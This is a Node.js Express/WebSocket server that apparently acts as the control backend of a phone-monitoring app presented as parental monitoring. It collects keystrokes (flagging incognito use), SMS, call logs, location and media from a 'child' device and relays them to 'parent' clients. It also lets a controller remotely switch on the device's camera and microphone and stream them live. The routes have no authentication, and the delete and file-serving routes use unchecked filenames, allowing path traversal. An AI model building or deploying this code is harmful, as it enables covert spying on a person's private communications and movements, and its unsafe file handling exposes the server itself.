const WebSocket = require("ws");
const express = require("express");
const path = require("path");
const fs = require("fs");
const bodyParser = require("body-parser");
const cors = require("cors");

const app = express();
const storageDir = path.join(__dirname, "storage", "child_device_001");

if (!fs.existsSync(storageDir)) {
    fs.mkdirSync(storageDir, { recursive: true });
    console.log("LOG: Created storage directory:", storageDir);
}

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));
app.use('/storage', express.static(storageDir));

app.get("/api/storage", (req, res) => {
    try {
        const files = fs.readdirSync(storageDir).map((file) => ({
            name: file,
            path: `/storage/child_device_001/${file}`,
            size: (fs.statSync(path.join(storageDir, file)).size / 1024).toFixed(2),
            type: file.endsWith(".json") ? "log" : file.endsWith(".opus") ? "audio" : file.endsWith(".mp4") ? "video" : "image",
        }));
        console.log("LOG: Fetched storage file list");
        res.json(files);
    } catch (e) {
        console.error("ERROR: Failed to list storage:", e.message);
        res.status(500).json({ error: "Failed to list storage" });
    }
});

app.get("/api/logs/:type", (req, res) => {
    const { type } = req.params;
    const validTypes = ["keylog", "location", "sms", "call_log"];
    if (!validTypes.includes(type)) {
        return res.status(400).json({ error: "Invalid log type" });
    }

    const logFile = path.join(storageDir, `${type}.json`);
    try {
        if (fs.existsSync(logFile)) {
            const logs = JSON.parse(fs.readFileSync(logFile));
            console.log(`LOG: Fetched ${type} logs`);
            res.json(logs);
        } else {
            console.warn(`WARN: No ${type} logs found`);
            res.json([]);
        }
    } catch (e) {
        console.error(`ERROR: Failed to fetch ${type} logs:`, e.message);
        res.status(500).json({ error: `Failed to fetch ${type} logs` });
    }
});

app.delete("/api/storage/delete", (req, res) => {
    const { filename } = req.body;
    if (!filename) {
        console.warn("WARN: Filename not provided for deletion");
        return res.status(400).json({ error: "Filename required" });
    }

    const filePath = path.join(storageDir, filename);
    try {
        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
            console.log(`LOG: Deleted file ${filename}`);
            res.json({ status: "File deleted" });
        } else {
            console.warn(`WARN: File not found for deletion: ${filename}`);
            res.status(404).json({ error: "File not found" });
        }
    } catch (e) {
        console.error(`ERROR: Failed to delete file ${filename}:`, e.message);
        res.status(500).json({ error: "Failed to delete file" });
    }
});

app.get("/storage/child_device_001/:filename", (req, res) => {
    const filePath = path.join(storageDir, req.params.filename);
    if (fs.existsSync(filePath)) {
        console.log(`LOG: Serving file ${req.params.filename}`);
        res.sendFile(filePath);
    } else {
        console.warn(`WARN: File not found: ${req.params.filename}`);
        res.status(404).json({ error: "File not found" });
    }
});

app.post("/api/command", (req, res) => {
    const { command, fps, resolution, cameraType, micType, sampleRate } = req.body;
    if (!command) {
        console.warn("WARN: Command not provided");
        return res.status(400).json({ error: "Command required" });
    }

    let sent = false;
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && clients.get(client) === "child") {
            const payload = { command };
            if ((command === 'start_camera' || command === 'record_camera') && (fps || resolution || cameraType)) {
                payload.fps = fps || 2;
                payload.resolution = resolution || '640x480';
                payload.cameraType = cameraType || 'back';
            }
            if ((command === 'start_audio' || command === 'record_audio') && (micType || sampleRate)) {
                payload.micType = micType || 'default';
                payload.sampleRate = sampleRate || 8000;
            }
            client.send(JSON.stringify(payload));
            sent = true;
            console.log(`LOG: Sent command to child: ${JSON.stringify(payload)}`);
        }
    });

    if (!sent) {
        console.warn("WARN: No connected child clients to send command");
    }

    res.json({ status: sent ? "Command sent" : "No child clients connected" });
});

app.get("*", (req, res) => {
    console.log(`LOG: Serving frontend to ${req.ip}`);
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

const server = app.listen(8080, '0.0.0.0', () => {
    console.log("LOG: Server running on http://192.168.0.102:8080");
});

const wss = new WebSocket.Server({ server });
const clients = new Map();
const SESSION_THRESHOLD_MS = 2000; // Matches child app's 2-second session grouping

wss.on("connection", (ws, req) => {
    const clientAddress = `${req.socket.remoteAddress}:${req.socket.remotePort}`;
    console.log(`LOG: WebSocket client connected from ${clientAddress}`);

    ws.on("message", (message, isBinary) => {
        try {
            if (!isBinary) {
                const parsed = JSON.parse(message);
                console.log(`LOG: Parsed message from ${clientAddress}:`, parsed);

                if (parsed.clientType) {
                    clients.set(ws, parsed.clientType);
                    console.log(`LOG: Registered ${parsed.clientType} client from ${clientAddress}`);
                    if (parsed.clientType === "child") {
                        wss.clients.forEach((client) => {
                            if (client.readyState === WebSocket.OPEN && clients.get(client) === "parent") {
                                client.send(JSON.stringify({ type: "child_connected", deviceId: parsed.deviceId || "unknown" }));
                            }
                        });
                    }
                    return;
                }

                if (parsed.dataType === "camera_frame") {
                    wss.clients.forEach((client) => {
                        if (client !== ws && client.readyState === WebSocket.OPEN && clients.get(client) === "parent") {
                            client.send(JSON.stringify(parsed));
                            console.log(`LOG: Forwarded camera_frame to parent client from ${clientAddress}`);
                        }
                    });
                    return;
                }

                if (parsed.dataType === "audio_frame") {
                    ws.currentAudioFrameMetadata = parsed; // Store metadata for next binary message
                    return;
                }

                const { deviceId, dataType, data, timestamp, appName, isIncognito } = parsed;
                if (deviceId && dataType && data && timestamp) {
                    const logDir = path.join(__dirname, "storage", deviceId);
                    if (!fs.existsSync(logDir)) {
                        fs.mkdirSync(logDir, { recursive: true });
                        console.log(`LOG: Created storage directory: ${logDir}`);
                    }

                    if (dataType === "keylog" || dataType === "location" || dataType === "sms" || dataType === "call_log") {
                        const logFile = path.join(logDir, `${dataType}.json`);
                        let logs = fs.existsSync(logFile) ? JSON.parse(fs.readFileSync(logFile)) : [];

                        let logEntry = { deviceId, dataType, data, timestamp };
                        if (dataType === "keylog") {
                            logEntry.appName = appName || "unknown"; // Updated from packageName to appName
                            logEntry.isIncognito = isIncognito || false;
                            logEntry.sessionId = generateSessionId(logs, logEntry);
                        }

                        logs.push(logEntry);
                        fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
                        console.log(`LOG: Appended ${dataType} entry to ${logFile} from ${clientAddress}`);
                    } else if (dataType === "audio" || dataType === "video" || dataType === "image") {
                        const extension = dataType === "audio" ? ".opus" : dataType === "video" ? ".mp4" : ".jpg";
                        const filePath = path.join(logDir, `${dataType}_${timestamp}${extension}`);
                        fs.writeFileSync(filePath, Buffer.from(data, "base64"));
                        console.log(`LOG: Saved ${dataType} file to ${filePath} from ${clientAddress}`);
                        parsed.file = `/storage/child_device_001/${dataType}_${timestamp}${extension}`;
                    }

                    wss.clients.forEach((client) => {
                        if (client.readyState === WebSocket.OPEN && clients.get(client) === "parent") {
                            client.send(JSON.stringify(parsed));
                        }
                    });
                    console.log(`LOG: Processed ${dataType} data from ${clientAddress}`);
                } else {
                    console.warn(`WARN: Invalid message format from ${clientAddress}: Missing required fields`);
                    ws.send(JSON.stringify({ error: "Invalid message format, missing deviceId, dataType, data, or timestamp" }));
                }
            } else if (isBinary && ws.currentAudioFrameMetadata) {
                wss.clients.forEach((client) => {
                    if (client !== ws && client.readyState === WebSocket.OPEN && clients.get(client) === "parent") {
                        client.send(JSON.stringify(ws.currentAudioFrameMetadata));
                        client.send(message); // Forward binary audio data
                        console.log(`LOG: Forwarded audio_frame binary data to parent client from ${clientAddress}`);
                    }
                });
                ws.currentAudioFrameMetadata = null;
            }
        } catch (e) {
            console.error(`ERROR: Failed to process message from ${clientAddress}:`, e.message);
            ws.send(JSON.stringify({ error: `Failed to process message: ${e.message}` }));
        }
    });

    ws.on("close", () => {
        if (clients.get(ws) === "child") {
            wss.clients.forEach((client) => {
                if (client.readyState === WebSocket.OPEN && clients.get(client) === "parent") {
                    client.send(JSON.stringify({ type: "child_disconnected", deviceId: "child_device_001" }));
                }
            });
        }
        clients.delete(ws);
        console.log(`LOG: WebSocket client disconnected from ${clientAddress}`);
    });

    ws.on("error", (err) => {
        console.error(`ERROR: WebSocket error from ${clientAddress}:`, err.message);
    });
});

// Generate session ID for keylog entries based on appName and timestamp
function generateSessionId(logs, newEntry) {
    if (!newEntry.appName || newEntry.dataType !== "keylog") {
        return `session_${newEntry.timestamp}`;
    }

    const lastLog = logs
        .filter(log => log.dataType === "keylog" && log.appName === newEntry.appName)
        .sort((a, b) => b.timestamp - a.timestamp)[0];

    if (lastLog && (newEntry.timestamp - lastLog.timestamp) <= SESSION_THRESHOLD_MS) {
        return lastLog.sessionId || `session_${lastLog.timestamp}`;
    }

    return `session_${newEntry.timestamp}`;
}
